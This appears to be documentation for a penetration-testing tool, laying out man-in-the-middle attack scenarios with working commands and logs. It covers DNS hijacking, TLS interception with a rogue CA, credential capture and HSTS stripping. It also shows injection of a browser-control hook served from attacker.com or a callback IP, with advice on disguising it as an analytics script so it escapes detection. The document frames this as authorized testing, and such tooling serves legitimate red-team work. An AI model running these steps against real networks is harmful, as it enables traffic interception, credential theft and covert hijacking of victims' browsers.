# Attack Scenarios

> Real-world MITM attack scenarios for authorized penetration testing.

## Warning

> **AUTHORIZED USE ONLY**: These scenarios are for educational purposes and authorized security assessments only. Unauthorized interception of network traffic is illegal.

## Scenario 1: Full MITM Attack

### Objective

Complete traffic interception for a corporate network assessment.

### Prerequisites

- Authorization document signed
- Network access (same subnet as targets)
- Root/admin access on attacker machine

### Setup

```bash
# Step 1: Generate CA certificate
rb mitm intercept generate-ca --output ./certs

# Step 2: Export CA for target installation
rb mitm intercept export-ca --ca-cert ./certs/mitm-ca.pem \
  --format der --output ./certs/mitm-ca.der

# Step 3: Start full MITM stack
sudo rb mitm intercept start \
  --target "*.corp.target.com" \
  --proxy-ip 10.0.0.5 \
  --dns-bind 0.0.0.0:53 \
  --proxy-port 8080 \
  --log \
  --log-file traffic.log \
  --ca-cert ./certs/mitm-ca.pem \
  --ca-key ./certs/mitm-ca-key.pem
```

### Target Configuration

**Option A: Manual DNS**
```bash
# On target machine
echo "nameserver 10.0.0.5" | sudo tee /etc/resolv.conf
```

**Option B: DHCP Spoofing** (if authorized)
```bash
# Configure rogue DHCP to advertise your DNS
# Example with dnsmasq:
# dhcp-option=6,10.0.0.5
```

**Option C: ARP Spoofing** (if authorized)
```bash
# Intercept traffic to legitimate DNS
# Requires additional tools and authorization
```

### Install CA on Target

1. Transfer `mitm-ca.der` to target machine
2. Install in target's trust store (see [Certificates](04-certificates.md))
3. Restart browser if needed

### Verification

```bash
# On target: Verify DNS hijacking
nslookup app.corp.target.com
# Should return: 10.0.0.5

# On target: Verify no certificate warnings
curl https://app.corp.target.com
# Should work without errors

# On attacker: Check traffic log
tail -f traffic.log
```

### Expected Output

```
[DNS] Query from 192.168.1.50: app.corp.target.com (A)
[DNS] HIJACK: app.corp.target.com → 10.0.0.5
[MITM] CONNECT to app.corp.target.com:443
[MITM] TLS handshake with client complete
[MITM] TLS handshake with target complete
[MITM] [app.corp.target.com] GET /api/v1/users HTTP/1.1
[MITM] [app.corp.target.com] <- 200 OK
```

---

## Scenario 2: Browser Proxy Testing

### Objective

Intercept traffic from a specific browser for application testing.

### Setup

```bash
# Start proxy only (no DNS hijacking)
rb mitm intercept proxy --proxy-port 8080 --log

# Or with interactive shell
rb mitm intercept shell --proxy-port 8080
```

### Browser Configuration

**Firefox:**
1. Settings → Network Settings → Manual proxy
2. HTTP Proxy: `127.0.0.1`, Port: `8080`
3. Check "Also use this proxy for HTTPS"

**Chrome:**
```bash
# Launch with proxy
google-chrome --proxy-server="http://127.0.0.1:8080"
```

**System-wide (macOS):**
1. System Preferences → Network → Advanced → Proxies
2. Check "Web Proxy (HTTP)" and "Secure Web Proxy (HTTPS)"
3. Server: `127.0.0.1`, Port: `8080`

### Install CA in Browser

See [Certificate Installation](04-certificates.md#installing-ca-certificate)

### Testing

1. Browse to target application
2. Watch traffic in terminal or shell
3. Look for sensitive data, API keys, credentials

---

## Scenario 3: Credential Capture

### Objective

Capture login credentials during authorized red team exercise.

### Setup

```bash
# Start with JSON logging for easy parsing
rb mitm intercept proxy --proxy-port 8080 \
  --log-file creds.json --log-format json
```

### Monitoring

```bash
# Watch for login attempts in real-time
tail -f creds.json | jq 'select(.path | contains("login"))'

# Or use shell with filter
rb mitm intercept shell --proxy-port 8080
# In shell: :filter path:*login* method:POST
```

### Post-Capture Analysis

```bash
# Find all POST requests
cat creds.json | jq 'select(.method=="POST")'

# Find requests with "password" in path
cat creds.json | jq 'select(.path | contains("password"))'

# Extract unique hosts
cat creds.json | jq -r '.host' | sort -u
```

### What to Look For

| Data Type | Common Locations |
|-----------|-----------------|
| Passwords | POST body, Authorization header |
| API Keys | Authorization header, query params |
| Session Tokens | Cookie header, response Set-Cookie |
| OAuth Tokens | Authorization header, response body |
| JWT Tokens | Authorization Bearer, response body |

---

## Scenario 4: RBB Hook Injection (External Mode)

### Objective

Inject RBB (redblue Browser) hook into intercepted web pages for browser control and exploitation.

### Prerequisites

- RBB server running (`http://attacker.com:3000`)
- Hook URL: `http://attacker.com:3000/hook.js`

### Setup

```bash
# Start proxy with hook injection (external mode)
rb mitm intercept proxy --proxy-port 8080 \
  --hook "http://attacker.com:3000/hook.js" \
  --log
```

### How It Works

1. Client requests HTML page
2. Proxy strips `Accept-Encoding` to prevent compression
3. Proxy receives HTML response
4. Proxy injects `<script src="http://attacker.com:3000/hook.js"></script>`
5. Client receives modified HTML
6. Browser executes hook, connecting to RBB

### Verification

```
[MITM] Stripped Accept-Encoding from target.com
[MITM] [target.com] GET / HTTP/1.1
[MITM] [target.com] <- 200 OK
[MITM] Injected hook into response from target.com
```

In RBB console:
- New hooked browser appears
- Can run RBB modules on target

### Notes

- Only works on HTTP responses with `Content-Type: text/html`
- Only injects if `</body>` tag is found
- Compressed responses (gzip) are prevented by stripping Accept-Encoding
- Requires CORS headers on RBB server (Access-Control-Allow-Origin: *)
- Cross-origin request is visible in browser DevTools

---

## Scenario 4b: RBB Hook Injection (Same-Origin Mode) ⭐

### Objective

Stealthier hook injection where the hook is served from the victim's own domain.

### Prerequisites

- RBB server running for callbacks (`http://10.0.0.5:3000`)
- MITM proxy intercepts the victim's traffic

### Setup

```bash
# Full MITM stack with same-origin hook
sudo rb mitm intercept start \
  --target "*.target.com" \
  --proxy-ip 10.0.0.5 \
  --hook-path "/assets/js/analytics.js" \
  --hook-callback "http://10.0.0.5:3000" \
  --log

# Or proxy-only mode
rb mitm intercept proxy --proxy-port 8080 \
  --hook-path "/assets/js/tracker.js" \
  --hook-callback "http://10.0.0.5:3000" \
  --log
```

### How It Works

```
1. Victim visits https://www.target.com
2. MITM proxy receives HTML response
3. Proxy injects: <script src="/assets/js/analytics.js"></script>
4. Victim's browser requests https://www.target.com/assets/js/analytics.js
5. MITM proxy INTERCEPTS this request (not forwarded to real server!)
6. Proxy serves RBB hook directly with callback URL configured
7. Hook executes in victim's browser (SAME ORIGIN - no CORS!)
8. Hook callbacks go to http://10.0.0.5:3000 (RBB server)
```

### Traffic Log

```
[MITM] [www.target.com] GET / HTTP/1.1
[MITM] [www.target.com] <- 200 OK
[MITM] Injected hook into response from www.target.com

[MITM] [www.target.com] GET /assets/js/analytics.js HTTP/1.1
[MITM] [www.target.com] Intercepting hook request: /assets/js/analytics.js -> serving RBB hook
[MITM] [www.target.com] <- 200 OK
[MITM] [www.target.com] Served RBB hook (4523 bytes) - callback: http://10.0.0.5:3000
```

### Advantages Over External Mode

| Aspect | External Mode | Same-Origin Mode |
|--------|--------------|------------------|
| CORS Required | Yes | No |
| Visible in DevTools | Cross-origin request | Looks like site resource |
| Detection Difficulty | Easy (external domain) | Hard (same domain) |
| CSP Bypass | Needs stripped CSP | Inherently allowed |
| Script Domain | `attacker.com` | `target.com` |

### Verification

In browser DevTools (Network tab):
- Script appears to load from `https://www.target.com/assets/js/analytics.js`
- No cross-origin indicators
- Looks like a legitimate site resource

In RBB console:
- New hooked browser appears
- Session shows origin as `https://www.target.com`

### Best Practices

1. **Choose realistic paths**: Use names like `/assets/js/analytics.js`, `/js/tracker.js`, `/static/telemetry.js`
2. **Match site patterns**: Look at real site resources and mimic naming
3. **Avoid common flags**: Don't use paths that might trigger security tools

### Notes

- Hook path must start with `/`
- Path is matched exactly (query strings ignored)
- Same rules apply: only HTML responses, needs `</body>` tag
- RBB server still needed for command/control callbacks

---

## Scenario 5: API Traffic Analysis

### Objective

Understand API structure and find vulnerabilities.

### Setup

```bash
# Interactive shell with JSON filter
rb mitm intercept shell --proxy-port 8080

# In shell:
:filter type:json
```

### Analysis Steps

1. **Map Endpoints**
   ```bash
   # Filter to API host
   :filter host:api.*
   ```

2. **Find Authentication**
   ```bash
   # Search for auth headers
   /authorization
   /bearer
   /token
   ```

3. **Identify Sensitive Operations**
   ```bash
   # Find admin endpoints
   :filter path:*admin*

   # Find user management
   :filter path:*user*
   ```

4. **Check for Vulnerabilities**
   - Missing authentication on endpoints
   - Exposed internal IDs
   - Sensitive data in responses
   - Verbose error messages

### Export for Analysis

```bash
# Log to JSON for later analysis
rb mitm intercept proxy --proxy-port 8080 \
  --log-file api-traffic.json --log-format json

# Analyze with jq
cat api-traffic.json | jq 'select(.host | contains("api"))'
```

---

## Scenario 6: WebSocket Inspection

### Objective

Monitor real-time WebSocket communications.

### Setup

```bash
# Start proxy with logging
rb mitm intercept proxy --proxy-port 8080 --log

# Or use shell
rb mitm intercept shell --proxy-port 8080
```

### What You'll See

```
[MITM] [ws.example.com] GET /socket HTTP/1.1
[MITM] [ws.example.com] WebSocket upgrade request detected
[MITM] [ws.example.com] <- 101 Switching Protocols
[MITM] [ws.example.com] WebSocket upgrade accepted
[MITM] [ws.example.com] WebSocket: Entering passthrough mode
[MITM] [ws.example.com] WebSocket C->S frame #1: text (45 bytes)
[MITM] [ws.example.com] WebSocket S->C frame #2: text (128 bytes)
[MITM] [ws.example.com] WebSocket C->S frame #3: ping (0 bytes)
[MITM] [ws.example.com] WebSocket S->C frame #4: pong (0 bytes)
```

### Limitations

- WebSocket frames are logged but not parsed
- Content is not decoded (passthrough mode)
- Frame types are identified (text, binary, ping, pong, close)

---

## Scenario 7: Mobile App Testing

### Objective

Intercept traffic from mobile applications.

### Prerequisites

- Device on same network as proxy
- CA certificate installed on device
- App doesn't use certificate pinning

### Setup

```bash
# Start proxy listening on all interfaces
rb mitm intercept proxy \
  --proxy-bind 0.0.0.0 \
  --proxy-port 8080 \
  --log
```

### Device Configuration

**Android:**
1. Settings → WiFi → Long press network → Modify
2. Advanced options → Proxy → Manual
3. Hostname: `10.0.0.5`, Port: `8080`

**iOS:**
1. Settings → WiFi → (i) next to network
2. HTTP Proxy → Manual
3. Server: `10.0.0.5`, Port: `8080`

### Install CA on Device

See [Certificate Installation](04-certificates.md#android) for Android/iOS instructions.

### Certificate Pinning Bypass

If app uses certificate pinning:
- Android: Use Frida to bypass
- iOS: Use SSL Kill Switch
- Both require jailbreak/root or app modification

---

## Scenario 8: Targeted Subdomain Interception

### Objective

Intercept only specific subdomains while allowing others.

### Setup

```bash
# Intercept only API subdomain
rb mitm intercept start \
  --target "api.*.target.com" \
  --proxy-ip 10.0.0.5 \
  --log

# Or multiple patterns (separate instances)
rb mitm intercept dns \
  --target "api.target.com" \
  --hijack-ip 10.0.0.5 \
  --dns-bind 0.0.0.0:53 &

rb mitm intercept dns \
  --target "auth.target.com" \
  --hijack-ip 10.0.0.5 \
  --dns-bind 0.0.0.0:5353 &
```

### Verification

```bash
# These are hijacked
nslookup api.target.com 10.0.0.5    # → 10.0.0.5
nslookup auth.target.com 10.0.0.5   # → 10.0.0.5

# These pass through
nslookup www.target.com 10.0.0.5    # → real IP
nslookup cdn.target.com 10.0.0.5    # → real IP
```

---

## Scenario 9: SSL Stripping (Downgrade)

### Objective

Force HTTPS to HTTP when possible.

### How It Works

The MITM proxy automatically strips HSTS headers:
- `Strict-Transport-Security` is removed
- Future visits won't force HTTPS
- Can intercept as HTTP (easier)

### Limitations

- HSTS preload list (built into browsers) can't be bypassed
- First visit to site may still use HTTPS
- Modern browsers may warn about downgrade

### Best Practice

Instead of stripping, intercept HTTPS directly:
- More reliable
- Works with modern sites
- Full TLS interception

---

## Scenario 10: Long-Term Monitoring

### Objective

Extended traffic capture over multiple days.

### Setup

```bash
# Use file logging with rotation
rb mitm intercept proxy --proxy-port 8080 \
  --log-file "/var/log/mitm/traffic-$(date +%Y%m%d).json" \
  --log-format json
```

### Log Management

```bash
# Create log rotation config
cat > /etc/logrotate.d/mitm << 'EOF'
/var/log/mitm/*.json {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
    create 640 root root
}
EOF
```

### Analysis Over Time

```bash
# Daily summary
for f in /var/log/mitm/traffic-*.json; do
  echo "=== $f ==="
  cat "$f" | jq -r '.host' | sort | uniq -c | sort -rn | head -10
done

# Find all login attempts
cat /var/log/mitm/*.json | jq 'select(.path | contains("login"))'
```

---

## Cleanup Checklist

After any engagement:

- [ ] Stop all MITM processes
- [ ] Remove CA from target trust stores
- [ ] Delete CA private key securely
- [ ] Archive logs per engagement rules
- [ ] Document findings
- [ ] Restore target network configuration

```bash
# Secure deletion of sensitive files
shred -vfz -n 5 ./certs/mitm-ca-key.pem
rm -rf ./certs/

# Remove from Linux CA store
sudo rm /usr/local/share/ca-certificates/mitm-ca.crt
sudo update-ca-certificates
```

## Next Steps

- [Configuration](06-configuration.md) - Complete reference
- [Troubleshooting](06-configuration.md#troubleshooting) - Common issues
